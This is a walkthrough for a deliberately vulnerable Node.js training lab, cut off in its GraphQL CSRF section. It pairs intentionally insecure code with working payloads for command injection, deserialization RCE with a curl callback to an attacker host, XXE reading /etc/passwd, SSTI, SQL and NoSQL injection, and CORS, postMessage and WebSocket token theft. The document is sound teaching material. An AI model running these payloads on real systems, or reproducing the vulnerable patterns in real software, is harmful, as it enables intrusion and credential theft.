<center>
<h1> Vulnerable NodeJS Application</h1>
<h3> github.com/payatu/vuln-nodejs-app </h3>
</center>

- [1. Command Injection](#1-command-injection)
  - [Exploit](#exploit)
  - [Vulnerable Code](#vulnerable-code)
  - [Fix](#fix)
- [2. Insecure Deserialization](#2-insecure-deserialization)
  - [Exploit](#exploit-1)
  - [Vulnerable code](#vulnerable-code-1)
  - [Fix](#fix-1)
- [3. JWT weak secret](#3-jwt-weak-secret)
  - [Exploit](#exploit-2)
  - [Vulnerable Code](#vulnerable-code-2)
  - [Fix](#fix-2)
- [4. IDOR](#4-idor)
  - [Exploit](#exploit-3)
  - [Vulnerable Code](#vulnerable-code-3)
  - [Fix](#fix-3)
- [5. XSS](#5-xss)
  - [Case 1: User supplied input rendered without any sanitization](#case-1-user-supplied-input-rendered-without-any-sanitization)
  - [Case 2: User supplied input rendered inside script tag](#case-2-user-supplied-input-rendered-inside-script-tag)
  - [Case 3: XSS inside JSON object](#case-3-xss-inside-json-object)
- [6. SSTI](#6-ssti)
  - [Exploit](#exploit-4)
  - [Vulnerable Code](#vulnerable-code-4)
- [7. SQL Injection:](#7-sql-injection)
  - [Exploit](#exploit-5)
  - [Vulnerable Code](#vulnerable-code-5)
- [8. XXE](#8-xxe)
  - [Exploit](#exploit-6)
  - [Vulnerable code:](#vulnerable-code-6)
- [9. SSRF via PDF generator](#9-ssrf-via-pdf-generator)
  - [Exploit](#exploit-7)
  - [Vulnerable Code](#vulnerable-code-7)
- [10. postMessage XSS](#10-postmessage-xss)
  - [Exploit](#exploit-8)
  - [Vulnerable Code](#vulnerable-code-8)
- [11. postMessage CSRF](#11-postmessage-csrf)
  - [Exploit](#exploit-9)
  - [Vulnerable Code](#vulnerable-code-9)
- [12. Information Disclosure using addEventListener](#12-information-disclosure-using-addeventlistener)
  - [Exploit](#exploit-10)
  - [Vulnerable code:](#vulnerable-code-10)
- [13. CORS Information Disclosure](#13-cors-information-disclosure)
  - [Exploit:](#exploit-11)
  - [Vulnerable Code](#vulnerable-code-11)
- [14. CORS CSRF](#14-cors-csrf)
  - [Exploit:](#exploit-12)
  - [Vulnerable Code](#vulnerable-code-12)
- [15. Insecure 2FA implementation.](#15-insecure-2fa-implementation)
  - [Exploit:](#exploit-13)
- [16. Cross-Site WebSocket Hijacking](#16-cross-site-websocket-hijacking)
  - [Exploit](#exploit-14)
  - [Vulnerable Code](#vulnerable-code-13)
  - [Fix](#fix-4)
- [17. WebSocket XSS](#17-websocket-xss)
  - [Exploit](#exploit-15)
  - [Vulnerable code](#vulnerable-code-14)
- [18. ReactJS XSS](#18-reactjs-xss)
  - [Exploit](#exploit-16)
  - [Vulnerable Code](#vulnerable-code-15)
- [19. React ref-innerHTML XSS](#19-react-ref-innerhtml-xss)
  - [Exploit](#exploit-17)
  - [Vulnerable code](#vulnerable-code-16)
- [20. NoSQL Injection](#20-nosql-injection)
  - [Exploit](#exploit-18)
  - [Vulnerable code](#vulnerable-code-17)
- [21. GraphQL Information Disclosure](#21-graphql-information-disclosure)
  - [Exploit](#exploit-19)
  - [Vulnerable Code](#vulnerable-code-18)
- [22. GraphQL SQLi](#22-graphql-sqli)
  - [Exploit](#exploit-20)
  - [Vulnerable code:](#vulnerable-code-19)
- [23. GraphQL CSRF](#23-graphql-csrf)
  - [Exploit](#exploit-21)
  - [Vulnerable code](#vulnerable-code-20)
- [24. GraphQL IDOR](#24-graphql-idor)
  - [Exploit](#exploit-22)
  - [Vulnerable code](#vulnerable-code-21)
- [25. XSS using SVG file upload](#25-xss-using-svg-file-upload)
  - [Exploit](#exploit-23)
  - [Vulnerable Code](#vulnerable-code-22)
- [26 JSONP Injection](#26-jsonp-injection)
  - [Exploit](#exploit-24)
  - [Vulnerable Code](#vulnerable-code-23)
- [27. NoSQL JavaScript Injection](#27-nosql-javascript-injection)
  - [Exploit](#exploit-25)
  - [Vulnerable Code](#vulnerable-code-24)

<div class="page-break"></div>

## 1. Command Injection 

Application is using **child_process.exec()** method to run ping on user supplied input your goal is to achieve the RCE.

### Exploit

Application is adding user supplied input to ping command without any sanitization and executing it using **exec** method that can lead to RCE if malicious input is provided, following payload will execute the whoami command on the server after running ping.

```bash
google.com; whoami
```

### Vulnerable Code

**Route: /routes/app.js**

```js
router.route('/ping')
    .get(authenticateToken, vuln_controller.ping_get)
    .post(authenticateToken, vuln_controller.ping_post); //  ping_post function in vuln_controller.js file
```

**Controller: /controllers/vuln_controller.js**

```js
const ping_post = (req, res) => {
    const ping = req.body.ping;
    const ping1 = req.body.ping1;
    if (ping) {
        exec('ping -c 3 ' + req.body.ping, function (err, stdout, stderr) {
            output = stdout + stderr;
            res.render('ping', {
                output: output,
                pingoutput: null
            });
        });
    }
```

### Fix

Use child_process package method **execFile** that starts a specific program and takes an array of arguments.

## 2. Insecure Deserialization

Application is using node-serialize method unserialize to parse the preference cookie, your goal is to acheive the RCE. 

### Exploit


**Step 1:** Create a serialized payload using node-serialize module.


```js
// serialize.js
var serialize = require('node-serialize')

// change yourwebsite.com to your host to receive callback
var payload = {payload: function(){require('child_process').exec('curl yourwebsite.com', function(error, stdout, stderr){console.log(stdout)})}} callback

console.log(serialize.serialize(payload))
```

Save the above code in a file and run it you will get the serialized payload.

```bash
> node serialize.js
{"payload":"_$$ND_FUNC$$_function(){require('child_process').exec('curl yourwebsite.com', function(error, stdout, stderr){console.log(stdout)})}"}
```

Now we have a serialized payload that can be deserialized using unserialize() function but the code will not execute until we trigger the function corresponding to the `payload` property to do that we can use the immediately invoked function expression for calling the function by adding `()` after the function, our final payload will look like this:

```json
{"payload":"_$$ND_FUNC$$_function(){require('child_process').exec('curl yourwebsite.com', function(error, stdout, stderr){console.log(stdout)})}()"}

```

Now replace this payload value with the preference cookie value in `/save-preference` POST request and you will receive a callback request on your attacker server.

**Reference:** https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

### Vulnerable code

**Request method, endpoint, injection point**
```bash
Request method: POST
Endpoint: /save-preference
Injection point: preference cookie
```

**Route: /app/routes.js**
```js
router.post('/save-preference', authenticateToken, vuln_controller.save_preference_post) 
```

**Controller: /controllers/vuln_controller.js**

```js
const save_preference_post = (req, res) => {
    const preference = serialize.unserialize(req.cookies.preference);
    res.send(preference);
}
```

### Fix

Do not use unserialize function on untrusted input.


## 3. JWT weak secret

Application is using the weak secret to create JSON web token that can lead to authentication bypass, your goal is to access the API Key of user **`vulnlabAdmin`**.

### Exploit

1. Get the `authToken` value from the cookie.

2. Save the token to a file.

3. Crack the secret using john.

```bash
$ john authToken.txt
```

4. Understand the JWT token structure to create a valid token.
   
```bash
# base64 decoded jwt token
{"alg":"HS256","typ":"JWT"}{"username":"vulnlabAdmin","iat":1646548200}�S�;�w������Θ�����FǪ��:�
```

5.  Application is using the `HS256` algorithm to sign the payload and in the payload it has a username that it is for identifying the user.

6. Use the secret to create a valid JWT for user **`vulnlabAdmin`** using **`jsonwebtoken`** package. 

```js
// createJwtToken.js
var jwt = require('jsonwebtoken')

const payload = {"username": "vulnlabAdmin"}
console.log(jwt.sign(payload, "secret"))
```

```bash
$ node jwt.js
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZ1bG5sYWJBZG1pbiIsImlhdCI6MTY0NjU0OTIyMn0.jntBGk0Dw7hiX81yo3-9afj0djZ3f-o5P0UapJbVCW
```

5. Now that we have a valid JWT for user **`vulnlabAdmin`** we can use it in **`authToken`** cookie value to access the API token of **`vulnlabAdmin`** user and complete this exercise.


### Vulnerable Code

```js
# /controllers/vuln_controllers.js
function generateAccessToken(username) {
    const payload = { "username": username };
    return jwt.sign(payload, process.env.JWT_SECRET);
}

# /.env
JWT_SECRET=secret
```

### Fix

Use strong secret to generate JWT

## 4. IDOR 

Application is loading Notes saved in a user account based on userid supplied in the URL path your goal is to access notes saved in **`vulnlabAdmin`** user account by performing IDOR.

**Request method & endpoint**

```
Request method: GET
endpoint: /notes/user/:userid
```
### Exploit

1. Go to **`/notes`** and create a note while intercepting request using burp suite.
2. Forward the note saving request and you will see another request to **`/notes/user/:userid`** to load your notes send this request to the repeater and guess the userid of user **`vulnlabAdmin`** to access his notes.


### Vulnerable Code

**Route: /routes/app.js**
```js
router.get('/notes/user/:userid', authenticateToken, vuln_controller.userNotes_get);
```

**Controller: /controllers/vulln_controller.js**

```js
const userNotes_get = (req, res) => {
    const userid = req.params.userid;
    Notes.findAll({ where: { userid: userid } })
        .then((queryResult) => {
            res.header("Content-Type", "application/json")
            res.send(JSON.stringify(queryResult));
        })
}
```

### Fix

Use id available in **`req`** object to load user notes instead of using user supplied input.

```js
const userNotes_get = (req, res) => {
    const userid = req.user.id; // fixed by using user id from req object returned from authenticateToken middleware  
    Notes.findAll({ where: { userid: userid } })
        .then((queryResult) => {
            res.header("Content-Type", "application/json")
            res.send(JSON.stringify(queryResult));
        })
}
```

## 5. XSS

Three different XSS cases are covered in this exercise depending on the <code>ejs</code> template syntax used to display user supplied input and context.

**Route: /routes/app.js**

```js
router.get('/xss', authenticateToken, vuln_controller.xss_lab);

```

**Controller: /controllers/vuln_controller.js**

```js
const xss_lab = (req, res) => {
    const xss1 = req.query.xss1;
    const xss2 = req.query.xss2;
    const xss3 = req.query.xss3;
    res.render('xss', {
        xss1: xss1,
        xss2: xss2,
        xss3: xss3
    });
}
```


### Case 1: User supplied input rendered without any sanitization

**View: /views/xss.ejs**

```js
<% if (xss1){%>
<br> <h5> Welcome <%- xss1 %></h5>
<% }%>
<br><br>
```

Application is rendering user supplied input using **ejs** raw output syntax (`<%- xss1 %>`) which does not encode special characters.

### Case 2: User supplied input rendered inside script tag

**View: /views/xss.ejs**

```js
<% if (xss2 || xss3){%>
<script>
var number = <%= xss2 %>;
...
</script>
<% }%>
```

In this case, the application is rendering user supplied input using ejs escape output syntax (<%= xss2 %>) which escapes special characters but the reflection is happening inside the script tag so an attacker can execute the XSS attack without using the special characters.

### Case 3: XSS inside JSON object

**View: /views/xss.ejs**

```js
<% if (xss2 || xss3){%>
<script>
...
var b = <%- JSON.stringify({"username": xss3})%>;
</script>
<% }%>
```

In this case, the application is using `<%-JSON.stringify("{username": xss3})%>` to create JSON object with user supplied input it is using ejs raw output syntax `<%-` to create a valid JSON object it does not use `<%=` output syntax because it will also encode the double quotes but JSON.stringify will escape double quotes that means we have to find a way to break out of the double quote to do that we will use this payload `</script><script>alert(1)</script>`.

## 6. SSTI

Application is directly concatenating user supplied input to the template that can lead to SSTI your goal is to steal the database credentials.

### Exploit

1. Go to **`/ssti?path=helloworld`**.
2. You will notice that `helloworld` is displayed in the response, now try ssti polyglot payload `${{<%25[%25'"}}%25\.` in the path parameter you will get the following error message which suggests that template engine uses `<%, %>` for opening and closing tag one such template engine is ejs.
   ```
   Error: Could not find matching close tag for "<%".
   ```
3. Let's perform simple multiply using following payload.
  ```
  <%25= 7*7%25>
  ```
4. And we get `49` in the response.
5. Time to get database credentials from database for that we will use the following payload
```
<%25=JSON.stringify(process.env)%25>
```


### Vulnerable Code

**Request method, endpoint, query parameter**

```
Request method: GET
Endpoint: /ssti
query parameter: path
```

**Route: /routes/app.js**
```js
router.get('/ssti', authenticateToken, vuln_controller.ssti);
```
**Controller: /controllers/vuln_controller.js**

```js
function notFoundPage(input) {
    if (input == undefined) input = "";
    var template = `<!DOCTYPE html><html><body>
    <h1>Error: 404</h1>
    <b><p>Not Found: /ssti/`+ input + `</p></b></body></html>`
    var html = ejs.render(template, { name: "Venus" })
    return html;
}

// ssti controller
const ssti = (req, res) => {
    const user_supplied_path = req.query.path;
    const html = notFoundPage(user_supplied_path)
    res.send(html).status(404);
}
```

## 7. SQL Injection:

Application is concatenating user supplied input to SQL query without any validation.

### Exploit

1. Go to `/sqli` and select station from list and click on **check** while intercepting request using burp suite.
2. Add `'` at the end of the URL path you will see the SQL error from here you can proceed to get database details.

<div class="page-break"></div>

### Vulnerable Code

**Route: /routes/app.js**
```js
router.get('/sqli/:from-:to', authenticateToken, vuln_controller.sqli_check_train_get);
```

**Controller: /controllers/vuln_controller.js**
```js
const sqli_check_train_get = (req, res) => {
    const from = req.params.from;
    const to = req.params.to;
    const q = "SELECT ntrains FROM trains where from_stnt='" + from + "' and to_stnt='" + to + "';";
    con.connect(function (err) {
        if (err) throw err;
        con.query(q, (err, results) => {
            if (err) {
                res.send(err);
            };
            res.send(JSON.stringify(results));
        });
    });
}
```


## 8. XXE

Application is using `libxmljs` to parse XML input but `noent` flag is set to true which enables external entities parsing. your goal is to read `/etc/passwd` file.

### Exploit

1. Go to `/xxe` and add a random comment while intercepting requests using burp suite.
2. Change the comment parameter value with the following payload to read `/etc/passwd` file.
   
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE asdf [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<root> <comment>
    <content>%26xxe;</content>
</comment></root>
```

### Vulnerable code:

**Routes: /routes/app.js**

```js
router.post('/comment', authenticateToken, vuln_controller.xxe_comment);
```

**Controller: /controllers/vuln_handler.js**

```js
const xxe_comment = (req, res) => {
    const rawcomment = req.body.comment;
    const parsecomment = libxmljs.parseXmlString(rawcomment, { noent: true, noblanks: true });
    var comment = parsecomment.get('//content');
    comment = comment.text();
    res.send(comment);
}
```


## 9. SSRF via PDF generator

Application is using html-pdf-node package to generate ticket PDF which takes HTML page as an input and generates the PDF but application is not sanitizing user input before generating the HTML page an attacker can use it to perform the SSRF.

### Exploit

Inject the following payload in the passenger name field to perform the SSRF and don't forget to change yourwebsite.com to your webserver to receive a callback

```
<iframe src="http://yourwebsite.com/asdf"/>
```

### Vulnerable Code

**Route: /routes/app.js**

```
router.get('/ticket/booking', authenticateToken, vuln_controller.ticket_booking_get);
```

**Controller: /controllers/vuln_controller.js**

```
const ticket_booking_get = (req, res) => {
    let options = { path: "test.pdf" };
    let file = { url: `http://localhost:${process.env.HOST_PORT}/ticket/generate_ticket?passenger_name=${req.query.passenger_name}&from_stnt=${req.query.from_stnt}&to_stnt=${req.query.to_stnt}&date=${req.query.date}` };

    html_to_pdf.generatePdf(file, options).then(pdfBuffer => {
        res.header('Content-Disposition', 'attachment; filename="ticket.pdf"');
        res.send(pdfBuffer);
    });
}
```

Application is receiving ticket details from the user and then using it to generate HTML page by using html-pdf-node package function generatePdf that takes URL as an input and generates the PDF from the received response.


## 10. postMessage XSS

The user edit page has an `addEventListener()` call that listens for the web message and inserts that message to a `<div>` without verifying the origin from where it received the message.

### Exploit

Create an HTML page with the following code and host it on your server to perform the XSS

```html
<html>
<body>
<iframe src="http://tauheedkhan.com:9000/user-edit" id="victimWebsite" width="100%" height="100%"></iframe>
<script>
  document.addEventListener('readystatechange', () =>{
    victimWebsite.contentWindow.postMessage("<img src=X onerror=alert(\"HACKED\")>", '*')
  })
</script>
</body>
</html>
```

### Vulnerable Code

**View: /views/user-edit.ejs**

```js
window.addEventListener("message", function(event){
    document.getElementById("displayMessage").removeAttribute('hidden')
    document.getElementById("displayMessage").innerHTML = event.data;
})
```


## 11. postMessage CSRF

Organization Management page has a functionality to add users to the organization when the org owner clicks on the `Add Users` button it opens a new popup window then the org owner selects a user from the list and clicks on the `Add` button this button posts a message using `postMessage()` to the tab which opened it then the opener tab receives the selected username using `addEventListener()` and sends the HTTP request to add that user in the org. Here opener tab does not verify the origin from which it received the message which means any origin can send an arbitrary username using `postMessage()` and that username will be added to the organization.

### Exploit


1. First create an organization in the victim account.
2. Create a hacker account.
3. Save the following code in an HTML file and replace the username with your hacker username and send that to the victim user your hacker user will get added to the victim organization.

```html
<html>
<body>
<iframe src="http://localhost:9000/organization" id="victimWebsite" width="100%" height="100%"></iframe>
<script>
  document.addEventListener('readystatechange', () =>{
    victimWebsite.contentWindow.postMessage("<hacker_username>", '*')
  })
</script>
</body>
</html>
```

### Vulnerable Code

**View: /views/organization.ejs**

```
window.addEventListener('message', function (event) {
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (xhr.readyState == XMLHttpRequest.DONE && xhr.status == 200) {
      document.getElementById("userAddMessage").innerHTML = "User Added";
      loadUsers();
    }
  }
  xhr.open('POST', window.location.origin + '/organization/add-user')
  xhr.withCredentials = true;
  xhr.setRequestHeader('Authorization', '<%=token%>');
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.send("user=" + event.data);
  })
```

## 12. Information Disclosure using addEventListener

In this exercise you will learn how insecure use of `postMessage` can be used to steal the sensitive information, `/api-token` page has a button to show your API Key, when you click on it, it will open a new popup window which will fetch the user API token and send it to the opener window using postmessage, Since it sends the message to the opener window without specifically specifying the origin, An attacker domain which opens the `/api-token/show` will be able to receive the API token.

### Exploit

Save the following HTML code in an HTML file, host it on your server and send the link to the victim you will see a popup showing the victim API token to further exploit you can send the API token to your attacker server.

```html
<html>
<body>
<script>
  window.open("http://tauheedkhan.com:9000/api-token/show", "popup");
  window.addEventListener("message", function(event){
    alert(event.data.token);
  })
</script>
</body>
</html>
```

### Vulnerable code:

**View: /views/webmessage-api-token-popup.ejs**

```html
<script>
    var token = "<%-apiToken%>";
    window.opener.postMessage({'token': token}, '*')
    window.close()
</script>
```

## 13. CORS Information Disclosure

`cors-api-token` endpoint is vulnerable to Cross-Origin Resource Sharing your goal is to exploit it to steal victim user API Token.

### Exploit:

1. Save the following HTML code in an HTML file.

```
<html>
<body>
<center>CORS Exploiting POC</center>
<script>
document.addEventListener('readystatechange', ()=>{
  fetch('http://tauheedkhan.com:9000/cors-api-token', {credentials: 'include'})
    .then((response)=>{
      return response.text()
    })
    .then((html)=>{
      var parser = new DOMParser();
      var doc = parser.parseFromString(html, "text/html")
      var apiToken = doc.getElementById("apiToken").value;
      alert(apiToken);
    })
    .catch((err)=>{
      console.log(`Error: ${err}`)
    })
  })
</script>
</body>
</html>
```

2. Open the link in your victim browser and you will see a popup with a user API token you can also transfer this API token to your attacker server.
   
### Vulnerable Code

**Request endpoint & method**

```
Endpoint: /cors-api-token
Method: GET
```

**Route: /routes/app.js**

```js
router.get('/cors-api-token', authenticateToken, vuln_controller.cors_api_token_get);

```

**Controller: /controllers/vuln_controller.js**

```js
const cors_api_token_get = (req, res) => {
    const apiToken = req.user.apiToken;
    if (req.get('origin') !== undefined) {
        res.header("Access-Control-Allow-Origin", req.get('origin'));
        res.header("Access-Control-Allow-Credentials", 'true');
    }
    res.render('cors-api-token', { apiToken })
}
```

## 14. CORS CSRF

`cors-csrf-edit-password` endpoint is used for updating password this endpoint only accepts content type `application/json` and it is not possible to send this content type without application allowing cross origin connection so we test for it and find out that endpoint is vulnerable to Cross Origin Resource Sharing we can exploit it to perform CSRF and change victim password.  

### Exploit:

1. Host the following code in an HTML file on your attacker server.  

```html
<html>
<body>
<center>CORS CSRF POC</center>
<script>
const data = {"password": "hacked", "password_confirm":"hacked"}

document.addEventListener('readystatechange', ()=>{
  fetch(
        'http://tauheedkhan.com:9000/cors-csrf-edit-password', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(data)
  })
    .then(resp => resp.text())
      .then(respText => {
        alert(respText);
      })
})
</script>
</body>
</html>
```

2. Open the HTML file in the victim browser and you will see a popup "Password update Successful!".
   
### Vulnerable Code

**Request endpoint, method, content-type**

```
Endpoint: /cors-csrf-edit-password
Method: POST
Content-Type: application/json
```

**Route: /routes/app.js**

```js
router.route('/cors-csrf-edit-password')
    .get(authenticateToken, vuln_controller.cors_csrf_edit_password_get)
    .post(authenticateToken, vuln_controller.cors_csrf_edit_password_post)
    .options(vuln_controller.cors_csrf_edit_password_option);
```

**Controller: /controllers/vuln_controller.js**

```js
// handle Preflight (OPTIONS) request
const cors_csrf_edit_password_option = (req, res) => {
    if (req.get('origin') !== undefined) {
        res.header("Access-Control-Allow-Origin", req.get('origin'));
        res.header("Access-Control-Allow-Credentials", 'true');
        res.header("Access-Control-Allow-Methods", 'GET, POST');
        res.header("Access-Control-Allow-Headers", 'Content-Type');
        res.header("Access-Control-Max-Age", '5');
    }
    res.send(200);
}

// handle edit password request
const cors_csrf_edit_password_post = (req, res) => {
    if (req.get('origin') !== undefined) {
        res.header("Access-Control-Allow-Origin", req.get('origin'));
        res.header("Access-Control-Allow-Credentials", 'true');
    }
    if (!req.is('application/json')) return res.status(400).send('Invalid content type')
    if (req.body.password == '' || req.body.password == undefined || req.body.password == null) return res.sendStatus('400');
    Users.update({ password: md5(req.body.password) }, { where: { username: req.user.username } })
        .then((queryResults) => {
            res.send("Password update Successful!");
        })
        .catch((err) => {
            res.send('Unexpected error occured');
        })
}
```
## 15. Insecure 2FA implementation.

Application has implemented 2FA insecurely it presents a 2FA page after login if users have enabled it but an attacker can bypass it by forced browsing.

### Exploit:

1. Setup 2FA on your victim account logout from the account.
2. As an attacker login to the victim's account you will see the 2FA page but you can easily bypass it by using the forced browsing technique.

## 16. Cross-Site WebSocket Hijacking

Application is using an old version of socket.io which by default enables CORS your goal is to exploit it to access the wallet information of the victim user.

### Exploit

1. Save the following code in an HTML file on your server.
   
```html
<html>
<head>
<!-- websocket client library v2.3.0 -->
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2.3.0/dist/socket.io.min.js"></script>
</head>
<body>
<center>Cross Site WebSocket Hijacking</center>
<script>
window.onload = function(){
  var socket = io.connect('http://tauheedkhan.com:9000/'); // connect to websocket host
  socket.emit('crypto_usd_value'); // send websocket message to receive user wallet information
  socket.on('crypto_usd_value', data =>{
    alert(JSON.stringify(data)) // alert user wallet information
  })
}
</script>
</body>
</html>
```

2. Open the HTML file on your victim browser and you will see an alert showing the wallet information of the victim user.
   
### Vulnerable Code

**/package.json**

```
    "socket.io": "2.3.0",
```

### Fix

Use the latest version of the socket.io package to fix the issue as the version used in the application by default enables the CORS.

## 17. WebSocket XSS

Application is using socket.io for real-time chat but has only implemented client-side input sanitization which can be bypassed by intercepting the request before it goes to the server.

### Exploit

1. Create two accounts victim & hacker.
2. In the first browser login as a victim.
3. In the second browser login as hacker go to `/websocket-xss` and send a message while intercepting it using burp suite edit message value to perform XSS.
   
### Vulnerable code

**controller: /server.js**

```js
  socket.on('new_message', (data) => {
    io.sockets.emit('new_message', { message: data.message, username: socket.user.username, login_user: socket.user.username })
  })
```

**View: /views/websocket-xss.ejs**

```
  socket.on('new_message', (data) => {
    const current_messages = message_box.innerHTML
    if (data.username === current_user) {
      message_box.innerHTML = current_messages + `<b><p style="color:rgb(114, 114, 114); display: inline-block;"> You:</p></b> ${data.message}</pre><br>`
    } else {
      message_box.innerHTML = current_messages + `<b><p style="color:rgb(250, 127, 168); display: inline-block;"> ${data.username}:</p></b> ${data.message}</pre><br>`;
    }
  })
```

## 18. ReactJS XSS

Application is using ReactJS which provides by default protection from XSS attacks by encoding dangerous characters before appending it to the page but there are cases when it will not protect from XSS attacks, for example: when the application passes user-supplied input to `href` attribute.

### Exploit

Application is taking user-supplied website URL and passing it to anchor tag href attribute.

1. Go to `/react-href-xss` and inject the following payload in the website input field and once a user clicks on the URL they will see a popup.

```jsjavascript:alert(1)```

2. But currently this is a self XSS to attack other users we have to find a way to update other users' profiles which can be achieved by performing CSRF as the server also accepts `application/x-www-form-urlencoding` content-type.

### Vulnerable Code

**Request method, endpoint, parameter**

```
Method: POST
Endpoint: /react-xss
Parameter: website
```

**Route: /routes/app.js**

```js
router.route('/react*')
    .get(authenticateToken, vuln_controller.react_xss_get)
    .post(vuln_controller.react_xss_post);
```

**Controller: /controllers/vuln_controller.js**

```js
const react_xss_post = (req, res) => {
    console.log(req);
    res.header("Access-Control-Allow-Origin", req.get('origin'));
    res.header("Access-Control-Allow-Credentials", 'true');
    res.send({ name: req.body.name, email: req.body.email, website: req.body.website });
}
```

**View: /vuln_react_app/src/MyComponents/React_href_xss.js**

```
  <div id="updated" hidden>
    <p className="card-text">
      Name:  {this.state.name} <br />
      Email:  {this.state.email} <br />
      Website: <a href={this.state.website}>{this.state.website}</a> <br /><br />
      <button onClick={this.updateForm}>Edit</button>
    </p>
  </div>
```

## 19. React ref-innerHTML XSS

ReactJS provides an escape hatch to provide direct access to DOM elements. With direct access application can perform the desired operation, without requiring explicit support from React. There are two escape hatches provided by ReactJS which give access to native DOM elements: findDOMNode and createRef. In this exercise, the application is using refs with innerHTML property to display user-supplied input which makes it vulnerable to XSS.


### Exploit

1. Inject the following payload in the name, email & website field to confirm the XSS.
   
```
<img src=X onerror=alert(1)>
```

2. Chain this bug with CSRF to steal other users cookie.

### Vulnerable code

**Request method, endpoint & parameter**

```
Method: POST
Endpoint: /react-xss
Parameter: name, email & website
```

**Route: /routes/app.js**

```
router.route('/react*')
    .get(authenticateToken, vuln_controller.react_xss_get)
    .post(vuln_controller.react_xss_post);
```

**Controller: /controllers/vuln_controller.js**

```
const react_xss_post = (req, res) => {
    console.log(req);
    res.header("Access-Control-Allow-Origin", req.get('origin'));
    res.header("Access-Control-Allow-Credentials", 'true');
    res.send({ name: req.body.name, email: req.body.email, website: req.body.website });
}
```


## 20. NoSQL Injection

Application is using MongoDB to handle user notes your goal is to read a note with the title SuperSecretNote by performing NoSQL injection. 

### Exploit

1. Go to `/mongodb-notes` save a note while intercepting request using burp suite forward this request then you will see one more request to `/mongodb-notes/show-notes`.
2. Now perform the NoSQLi to see all notes saved in the database by using following payload.

```json
{"username":{"$ne":""}}
```

### Vulnerable code

**Request method, endpoint, parameter**

```
Method: POST
Endpoint: /mongodb-notes/show-notes
Parameter: username
```

**Route: /routes/app.js**

```
router.route('/mongodb-notes/show-notes')
    .post(authenticateToken, vuln_controller.mongodb_show_notes_post);
```

**Controller: /controllers/vuln_controller.js**

```
const mongodb_show_notes_post = (req, res) => {
    MongoClient.connect(dbURL, mongodb_config, (err, client) => {
        if (err) return res.status('500').send('MongoDB is not installed, Please follow the installation guideline.');
        const db = client.db('vuln_nodejs_app')
        db.collection('mongodb-notes').find({ username: req.body.username }).toArray()
            .then((notes) => {
                res.send(notes)
            }).catch((err) =>{
                res.status(500).send('Internal error!');
            })
    })
}
```

## 21. GraphQL Information Disclosure

Application is using GraphQL your goal is to disclose the information of other registered users.

### Exploit

If an application is using graphql and the introspection query is not disabled we can find out all the queries and see if any query is available that can leak sensitive information.

1. Go to graphql endpoint `/graphql`.
2. Refresh the page while intercepting request using burp suite transfer the request to repeater change the request method to POST and content-type to `application/json` and use the following introspection query in the body.

```json
{"query": "query IntrospectionQuery {__schema {queryType { name }         mutationType { name } subscriptionType { name } types {...FullType}directives {name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name         description args { ...InputValue } type { ...TypeRef } isDeprecated         deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef }       enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name           ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}
```

3. Copy the response and go to `https://apis.guru/graphql-voyager/` website click on the change schema button switch to the introspection tab and paste the introspection query response click on display and you will have a complete query map.
4. In Query type you will see a `listUsers` query that returns a list of users, we will use this query to list all the users registered in the application.
5. Go back to the burp repeater tab and replace the introspection query with the following query, click on go and you will get the username & email of all registered users.


```json
{"query": "query {listUsers{username email}}"}
```

### Vulnerable Code

**Route: /routes/app.js**

1. Introspection query is not disabled that leaked the hidden endpoint.

```js
router.use('/graphql', authenticateToken, graphqlHTTP({
    schema: schema,
    rootValue: vuln_controller.graphqlroot
}))
```

2. Lack of authorization check on the sensitive endpoint.
 
```js
const graphqlroot = {
    user: graphql_GetUser,
    listUsers: graphql_AllUsers, //listUsers query handler
    updateProfile: graphql_UpdateProfile,
    showProfile: graphql_ShowProfile
}
```

```js
async function graphql_AllUsers(){
    const q = "SELECT username, email from users;"
    await con.connect() 
    const userdata = await con.promise().query(q)
    console.log(userdata[0][0])
    return userdata[0]
}
```

## 22. GraphQL SQLi

Application is trusting data supplied from the client and using it in a SQL query without proper sanitization to display the user profile your goal is to perform SQL injection.

### Exploit

1. Go to `/graphql-user-profile`
2. Refresh the page while intercepting using burp suite, you will see a graphql request to `user` transfer it to the repeater.
3. Use the following payload in the username variable value to confirm SQLi.

```
'OR sleep(10)#
```

complete query

```
{"query":"query user($username: String!){ user(username: $username){ username email }}","variables":{"username":"adamjones'OR sleep(10)#"}}
```

### Vulnerable code:

**Route: /routes/app.js**

```js
router.use('/graphql', authenticateToken, graphqlHTTP({
    schema: schema,
    rootValue: vuln_controller.graphqlroot 
}))
```

**graphqlroot**

```js
const graphqlroot = {
    user: graphql_GetUser,   // user query handler
    listUsers: graphql_AllUsers,
    updateProfile: graphql_UpdateProfile,
    showProfile: graphql_ShowProfile 
}
```

**graphql_GetUser**

```js
async function graphql_GetUser(arg){
    const username = arg.username
    const q = "SELECT * FROM users where username='" + username + "';";
    await con.connect()
    const userdata = await con.promise().query(q)
    return userdata[0][0]
}
```

## 23. GraphQL CSRF

Application is using graphql to update user information, your goal is to change information of other users by performing CSRF attack.

### Exploit

`express-graphql` interpret request body depending upon the *Content-Type* header, which means we can perform the CSRF attack using `application/x-www-form-urlencoded` content-type or we can also perform CSRF by supplying query in GET parameter instead of using a POST request.

CSRF via POST request using `appilication/x-www-form-urlencoded` content-type.

1. Go to `graphql-update-profile`.
2. Change password while intercepting request using burp suite you will see graphQL password update request body.
   
```
{"query":"mutation { updateProfile(username: \"hacker\", email: \"hacker@gmail.com\", password: \"hacked\")}","variables":null}
```

3. Change the content-type of request to `application/x-www-form-urlencoded` and also the request body with the following.

```
query=mutation { updateProfile(username: "hacker", email: "hacker@gmail.com", password: "hacked")}&variables=null
```

